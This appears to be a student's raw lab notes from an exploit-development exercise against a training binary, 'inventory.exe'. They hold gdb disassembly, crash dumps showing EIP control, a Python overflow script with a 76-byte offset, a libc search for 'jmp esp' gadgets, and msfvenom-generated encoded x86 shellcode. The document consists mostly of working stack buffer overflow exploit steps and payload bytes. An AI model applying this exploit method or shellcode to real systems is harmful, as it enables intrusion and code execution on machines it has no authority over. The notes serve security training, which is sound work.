@@ -1,0 +1,368 @@
+gdb-peda$ pdisass main
+Dump of assembler code for function main:
+   0x08048543 <+0>:	lea    ecx,[esp+0x4]
+   0x08048547 <+4>:	and    esp,0xfffffff0
+   0x0804854a <+7>:	push   DWORD PTR [ecx-0x4]
+   0x0804854d <+10>:	push   ebp
+   0x0804854e <+11>:	mov    ebp,esp
+   0x08048550 <+13>:	push   ecx
+   0x08048551 <+14>:	sub    esp,0x4
+   0x08048554 <+17>:	call   0x8048571 <__x86.get_pc_thunk.ax>
+   0x08048559 <+22>:	add    eax,0x1aa7
+   0x0804855e <+27>:	call   0x80484d6 <getTheGoods>
+   0x08048563 <+32>:	mov    eax,0x0
+   0x08048568 <+37>:	add    esp,0x4
+   0x0804856b <+40>:	pop    ecx
+   0x0804856c <+41>:	pop    ebp
+   0x0804856d <+42>:	lea    esp,[ecx-0x4]
+   0x08048570 <+45>:	ret    
+End of assembler dump
+
+
+gdb-peda$ pdisass getTheGoods
+Dump of assembler code for function getTheGoods:
+   0x080484d6 <+0>:	push   ebp
+   0x080484d7 <+1>:	mov    ebp,esp
+   0x080484d9 <+3>:	push   ebx
+   0x080484da <+4>:	sub    esp,0x44
+   0x080484dd <+7>:	call   0x8048410 <__x86.get_pc_thunk.bx>
+   0x080484e2 <+12>:	add    ebx,0x1b1e
+   0x080484e8 <+18>:	sub    esp,0xc
+   0x080484eb <+21>:	lea    eax,[ebx-0x1a00]
+   0x080484f1 <+27>:	push   eax
+   0x080484f2 <+28>:	call   0x8048360 <printf@plt> **APPEARS IN RED**
+   0x080484f7 <+33>:	add    esp,0x10
+   0x080484fa <+36>:	mov    eax,DWORD PTR [ebx-0x4]
+   0x08048500 <+42>:	mov    eax,DWORD PTR [eax]
+   0x08048502 <+44>:	sub    esp,0x4
+   0x08048505 <+47>:	push   eax
+   0x08048506 <+48>:	push   0x200
+   0x0804850b <+53>:	lea    eax,[ebp-0x48]
+   0x0804850e <+56>:	push   eax
+   0x0804850f <+57>:	call   0x8048370 <fgets@plt>   **APPEARS IN RED**
+   0x08048514 <+62>:	add    esp,0x10
+   0x08048517 <+65>:	sub    esp,0xc
+   0x0804851a <+68>:	lea    eax,[ebx-0x19e0]
+   0x08048520 <+74>:	push   eax
+   0x08048521 <+75>:	call   0x8048390 <puts@plt>
+   0x08048526 <+80>:	add    esp,0x10
+   0x08048529 <+83>:	sub    esp,0xc
+   0x0804852c <+86>:	push   0x1388
+   0x08048531 <+91>:	call   0x8048380 <usleep@plt>
+   0x08048536 <+96>:	add    esp,0x10
+   0x08048539 <+99>:	mov    eax,0x0
+   0x0804853e <+104>:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x08048541 <+107>:	leave  
+   0x08048542 <+108>:	ret    
+End of assembler dump.
+
+
+
+gdb-peda$ run <<< $(python /home/student/Downloads/exploitdev1/exploit.py)
+Starting program: /home/student/Downloads/exploitdev1/inventory.exe <<< $(python /home/student/Downloads/exploitdev1/exploit.py)
+Press enter to view inventory: Total Inventory:
+Bandages: 12
+Kvass: 1.000
+Turnips: 12.000
+5.45x39: 20.000
+AK-74M: 200
+Zastava Koral: 50
+
+Program received signal SIGSEGV, Segmentation fault.
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x33634132 ('2Ac3')
+ECX: 0x0 
+EDX: 0x0 
+ESI: 0xf7fb7000 --> 0x1d7d8c 
+EDI: 0x0 
+EBP: 0x41346341 ('Ac4A')
+ESP: 0xffffd440 ("6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag\n")
+EIP: 0x63413563 ('c5Ac')
+EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x63413563
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd440 ("6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag\n")
+0004| 0xffffd444 ("Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag\n")
+0008| 0xffffd448 ("c9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag\n")
+0012| 0xffffd44c ("0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag\n")
+0016| 0xffffd450 ("Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag\n")
+0020| 0xffffd454 ("d3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag\n")
+0024| 0xffffd458 ("4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag\n")
+0028| 0xffffd45c ("Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag\n")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x63413563 in ?? ()
+
+
+student@lin-ops:~/Downloads/exploitdev1$ vim exploit.py
+
+
+
+ 1 buf = "A" * 76                                                                      
+  2 
+  3 eip = "B" * 4
+  4 
+  5 print(buf + eip)
+~                    
+
+
+
+
+student@lin-ops:~/Downloads/exploitdev1$ gdb in
+in.proftpd        infotocap         insmod            installwatch
+in.telnetd        init              install           instmodsh
+info              init.lxc          install-info      integritysetup
+infobrowser       init.lxc.static   install-packages  inventory.exe
+infocmp           inputattach       installkernel     invoke-rc.d
+student@lin-ops:~/Downloads/exploitdev1$ gdb inventory.exe 
+GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from inventory.exe...(no debugging symbols found)...done.
+gdb-peda$ run <<< $(python /home/student/Downloads/exploitdev1/exploit.py)
+Starting program: /home/student/Downloads/exploitdev1/inventory.exe <<< $(python /home/student/Downloads/exploitdev1/exploit.py)
+Press enter to view inventory: Total Inventory:
+Bandages: 12
+Kvass: 1.000
+Turnips: 12.000
+5.45x39: 20.000
+AK-74M: 200
+Zastava Koral: 50
+
+Program received signal SIGSEGV, Segmentation fault.
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x41414141 ('AAAA')
+ECX: 0x0 
+EDX: 0x0 
+ESI: 0xf7fb7000 --> 0x1d7d8c 
+EDI: 0x0 
+EBP: 0x41414141 ('AAAA')
+ESP: 0xffffd440 --> 0xf7fe000a (add    BYTE PTR [eax],al)
+EIP: 0x42424242 ('BBBB')
+EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x42424242
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd440 --> 0xf7fe000a (add    BYTE PTR [eax],al)
+0004| 0xffffd444 --> 0xffffd460 --> 0x1 
+0008| 0xffffd448 --> 0x0 
+0012| 0xffffd44c --> 0xf7df7fa1 (<__libc_start_main+241>:	add    esp,0x10)
+0016| 0xffffd450 --> 0xf7fb7000 --> 0x1d7d8c 
+0020| 0xffffd454 --> 0xf7fb7000 --> 0x1d7d8c 
+0024| 0xffffd458 --> 0x0 
+0028| 0xffffd45c --> 0xf7df7fa1 (<__libc_start_main+241>:	add    esp,0x10)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+gdb-peda$ 
+
+
+
+
+student@lin-ops:~/Downloads/exploitdev1$ env - gdb inventory.exe 
+GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from inventory.exe...(no debugging symbols found)...done.
+(gdb) show env
+LINES=45
+COLUMNS=88
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+(gdb) show env         
+(gdb) run
+Starting program: /home/student/Downloads/exploitdev1/inventory.exe 
+Press enter to view inventory: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Total Inventory:
+Bandages: 12
+Kvass: 1.000
+Turnips: 12.000
+5.45x39: 20.000
+AK-74M: 200
+Zastava Koral: 50
+
+Program received signal SIGSEGV, Segmentation fault.
+0x61616161 in ?? ()
+
+(gdb) info proc man
+Too many parameters: man
+(gdb) info proc map
+process 6114
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/student/Downloads/exploitdev1/inventory.exe
+	 0x8049000  0x804a000     0x1000        0x0 /home/student/Downloads/exploitdev1/inventory.exe
+	 0x804a000  0x804b000     0x1000     0x1000 /home/student/Downloads/exploitdev1/inventory.exe
+	 0x804b000  0x806d000    0x22000        0x0 [heap]
+	0xf7ddf000 0xf7fb4000   0x1d5000        0x0 /lib/i386-linux-gnu/libc-2.27.so
+	0xf7fb4000 0xf7fb5000     0x1000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
+	0xf7fb5000 0xf7fb7000     0x2000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
+	0xf7fb7000 0xf7fb8000     0x1000   0x1d7000 /lib/i386-linux-gnu/libc-2.27.so
+	0xf7fb8000 0xf7fbb000     0x3000        0x0 
+	0xf7fcf000 0xf7fd1000     0x2000        0x0 
+	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
+	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
+	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib/i386-linux-gnu/ld-2.27.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib/i386-linux-gnu/ld-2.27.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib/i386-linux-gnu/ld-2.27.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+(gdb) 
+process 6114
+Mapped address spaces:
+
+
+
+  right after the heap
+  0xf7ddf000
+  just beofre the stack
+  0xf7ffe000
+  
+  
+  (gdb) find /b  0xf7ddf000, 0xf7ffe000, 0xff, 0xe4
+0xf7de1b59
+0xf7f59597
+0xf7f598f7
+0xf7f5990f
+0xf7f59917
+0xf7f59a43
+0xf7f64d43
+0xf7f64d57
+0xf7f64f9f
+0xf7f64fc7
+0xf7f64fd7
+0xf7f65233
+0xf7f654b7
+0xf7f6563f
+0xf7f65807
+0xf7f6594b
+0xf7f65b3f
+0xf7f65d07
+0xf7f65db7
+0xf7f65eaf
+0xf7f66237
+0xf7f6631b
+0xf7f6638b
+0xf7f66a2f
+0xf7f66b1f
+0xf7f66dcf
+0xf7f670af
+0xf7f6712f
+0xf7f67167
+0xf7f67187
+
+
+student@lin-ops:~/Downloads/exploitdev1$ msfvenom -p linux/x86/exec CMD="whoami" -b '\x00' -f python
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 69 (iteration=0)
+x86/shikata_ga_nai chosen with final size 69
+Payload size: 69 bytes
+Final size of python file: 353 bytes
+buf =  b""
+buf += b"\xb8\x73\xc1\x95\x62\xd9\xeb\xd9\x74\x24\xf4\x5f\x31"
+buf += b"\xc9\xb1\x0b\x31\x47\x14\x83\xef\xfc\x03\x47\x10\x91"
+buf += b"\x34\xff\x69\x0d\x2e\x52\x08\xc5\x7d\x30\x5d\xf2\x16"
+buf += b"\x99\x2e\x94\xe6\x8d\xff\x06\x8e\x23\x89\x25\x02\x54"
+buf += b"\x8e\xa9\xa3\xa4\xe6\xc1\xcc\xc5\x65\x78\x13\x51\x25"
+buf += b"\xf3\xf2\x90\x49"
+
+
+
+
+
+Starting program: /.hidden/inventory.exe 
+Press enter to view inventory: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Total Inventory:
+Bandages: 12
+Kvass: 1.000
+Turnips: 12.000
+5.45x39: 20.000
+AK-74M: 200
+Zastava Koral: 50
+
+Program received signal SIGSEGV, Segmentation fault.
+0x61616161 in ?? ()
+(gdb) info proc map
+process 15422
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /.hidden/inventory.exe
+	 0x8049000  0x804a000     0x1000        0x0 /.hidden/inventory.exe
+	 0x804a000  0x804b000     0x1000     0x1000 /.hidden/inventory.exe
+	 0x804b000  0x806d000    0x22000        0x0 [heap]
+	0xf7def000 0xf7fc1000   0x1d2000        0x0 /lib32/libc-2.27.so
+	0xf7fc1000 0xf7fc2000     0x1000   0x1d2000 /lib32/libc-2.27.so
+	0xf7fc2000 0xf7fc4000     0x2000   0x1d2000 /lib32/libc-2.27.so
+	0xf7fc4000 0xf7fc5000     0x1000   0x1d4000 /lib32/libc-2.27.so
+	0xf7fc5000 0xf7fc8000     0x3000        0x0 
+	0xf7fcf000 0xf7fd1000     0x2000        0x0 
+	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
+	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
+	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+  
+  0xf7def000
+  0xf7ffe000
+  
+  
+  (gdb) find /b 0xf7def000, 0xf7ffe000, 0xff, 0xe4
+  
+  
+  0xf7f7365b
+0xf7f73c5f
+0xf7f73c67
+0xf7f742c3
+0xf7f743db
+0xf7f744eb
+0xf7f74643
+0xf7f7471b
+0xf7f747db
+
+
+
+buf =  b""
+buf += b"\xba\x16\xe3\xc8\xcc\xda\xc0\xd9\x74\x24\xf4\x58\x29"
+buf += b"\xc9\xb1\x11\x83\xe8\xfc\x31\x50\x0e\x03\x46\xed\x2a"
+buf += b"\x39\x0c\xfa\xf2\x5b\x82\x9a\x6a\x71\x41\xea\x8c\xe1"
+buf += b"\xaa\x9f\x3a\xf2\xdc\x70\xd9\x9b\x72\x06\xfe\x0e\x62"
+buf += b"\x05\x01\xaf\x72\x55\x60\xdb\x52\xb6\x4c\x50\xf7\xab"
+buf += b"\xe2\xf3\x83\x04\x2d\x8a\x0e\x29\x48\x01\xb5\xae\xd8"
+buf += b"\x80\x41\x1f\x6d\x2f\xcb\x5f\xda\xfc\x82\x81\x29\x82"
+  
+
+
